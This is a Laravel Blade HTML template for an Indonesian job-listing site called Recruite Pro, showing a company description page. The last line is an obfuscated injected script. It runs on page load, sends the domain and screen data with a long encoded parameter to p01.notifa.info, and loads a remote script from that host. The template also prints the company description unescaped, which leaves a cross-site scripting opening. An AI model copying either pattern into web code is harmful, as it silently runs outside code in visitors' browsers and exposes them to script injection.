<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
<title>Recruite Pro</title>
<!-- Bootstrap -->
<link href="{{ asset('pro/assets/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
<!-- Font Awesome CSS-->
<link href="{{ asset('pro/assets/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
<!-- Animate CSS -->
<link href="{{ asset('pro/assets/animate/animate.css')}}" rel="stylesheet">
<!-- Owl Carousel -->
<link href="{{ asset('pro/assets/owl-carousel/css/owl.carousel.css')}}" rel="stylesheet">
<link href="{{ asset('pro/assets/owl-carousel/css/owl.theme.css')}}" rel="stylesheet">
<!-- magnific Css -->
<link href="{{ asset('pro/assets/css/magnific-popup.css')}}" rel="stylesheet">
<!-- Custom CSS -->
<link href="{{ asset('pro/css/style.css')}}" rel="stylesheet">
<!-- Favicon -->
<link rel="shortcut icon" type="image/x-icon" href="{{ asset('pro/images/favicon.ico')}}">
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body>
<!-- Loader -->
<div id="dvLoading"></div>
<!-- Header Start -->
<header class="wow fadeInDown" data-offset-top="197" data-spy="affix">
  <div class="logo-wrapper"> 
    <!-- Logo -->
    <div class="container">
      <div class="row"> 
        <!-- Logo -->
        <div class="col-sm-12 col-md-3 hidden-xs"> <a href="index.html"><img src="{{ asset('pro/images/logo.png')}}" alt="Recruite Pro"/></a> </div>
        <!-- Navigation -->
        <div class="col-sm-12 col-md-9">
          <nav class="navbar navbar-default pull-right"> 
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
              <a class="navbar-brand" href="index.html"><img src="{{ asset('pro/images/logo.png')}}" alt="Recruite Pro"/></a> </div>
            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
              <ul class="nav navbar-nav">
                <li class="active"><a href="{{url('/')}}">Home</a></li>
                <li class="active"><a href="{{url('/lowongan')}}">Lowongan</a></li>
                <li class="active"><a href="{{route('lowongan.index')}}">Pasang Lowongan</a></li>
              </ul>
            </div>
            <!-- /.navbar-collapse -->
            <div class="user"><img src="{{ asset('pro/images/user-icon.png')}}" alt=""></div>
        <div class="login pull-right hidden-xs"> <a href="{{route('login')}}">Login</a></div>
        <div class="login pull-right hidden-xs"> <a href="{{route('register')}}">Sign up</a></div>
          </nav>
        </div>
      </div>
    </div>
  </div>
</header>
<!-- Header End --> 
<!-- breadcrumb Wrapper Start -->

<!-- breadcrumb Wrapper End --> 
<!-- Inner page Wrapper Start -->
<div class="inner-page-wrapper blog-details">
  <div class="container">
    <div class="row">
      <div class="col-md-9 col-xs-12">
        <article class="post format-image bg-white">
          <div class="post-preview"> <a href="#"><img src="{{ asset('pro/images/blog-big.jpg')}}" alt=""></a> </div>
          <div class="post-content post-no-pad">
            <h2 class="post-title"><a href="#">{{$perusahaan->nama_pers}} </a></h2>
            <ul class="post-meta">
              <li>April 20, 2017</li>
              <li>By <a href="#">Normal Theme</a></li>
            </ul>
            <p></p>
            
        <p>{!!$perusahaan->deskripsi!!}</p>
            <p></p>
          </div>
        </article>
        <!-- COMMENTS -->
        
        <!-- END COMMENTS --> 
        <button class="btn btn-one">Lamar Sekarang</button>
        <!-- COMMENT FORM -->
        
      </div>
    </div>
  </div>
</div>
<!-- Inner page Wrapper End --> 
<!-- Footer styles Start -->

<!-- Footer styles End --> 
<!-- Copyright styles End -->
<div class="copyright-wrapper">
  <div class="container">
    <p>&copy; Copyright 
      <script type="text/javascript">
	var d=new Date();
	document.write(d.getFullYear());
	</script> 
      Recruite Pro | All Rights Reserved.</p>
  </div>
</div>
<!-- Copyright styles End --> 
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) --> 
<script src="{{ asset('pro/assets/jquery/jquery-3.1.1.min.js')}}"></script> 
<!-- Include all compiled plugins (below), or include individual files as needed --> 
<script src="{{ asset('pro/assets/bootstrap/js/bootstrap.min.js')}}"></script> 
<script src="{{ asset('pro/assets/jquery/plugins.js')}}"></script> 
<script src="{{ asset('pro/assets/jquery/jquery.animateNumber.min.js')}}"></script> 
<script src="{{ asset('pro/assets/jquery/jquery.magnific-popup.min.js')}}"></script> 
<script src="{{ asset('pro/assets/owl-carousel/js/owl.carousel.js')}}"></script> 
<script src="{{ asset('pro/assets/wow/wow.min.js')}}"></script> 
<script src="{{ asset('pro/js/custom.js')}}"></script>
<!-- Global Site Tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83282272-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments)};
  gtag('js', new Date());

  gtag('config', 'UA-83282272-3');
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mPpgx50wDZcfol1Fmw8gpcqi77BtTHTTa7B5bdLnRH0xUWZtPh0ENVPyl7itgphtnFaCFYK1c0I%2fhq6V%2fSWSn00ToOjq7Wwlv42H5HS946SpEXpCVr8vv4qqB%2f2nZ6TboMptDaBBluoRDegGmJksUpg8%2fl%2bnvWeEiUup%2f7jlfLDDO6TnL1C228%2b8BSIuRDSVolHmSrFYPK3LXV2MRQeZfjJwY%2bMN%2bdgTHTE4LVUHlF8YaWPmVHP31wbKsZDDgG%2fcaddEV858f9iWxYIjzgKgx0ZmZveflEHnwblZLbfc45AjuEJZleKhnlCoFyHxRT33lopnWrZ4Wx96NM%2fjE35t0k%2fVyH3wP%2f75SDW6%2b5%2bGytI5WwUVJSo5vp9FsKp1Rn8crezP1hWxtvwWWrLUFqz33%2f8VcO%2bRDp4bbYCdC%2b2%2bQ7w1bBxQcSZciMCK8%2fUQiAbyKHOnh8SnfTVZmDqAirehqtDxcVQSgBZIIWsr%2bOfQR4JF2GMp4CvT84DBfVpDyrY4V" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>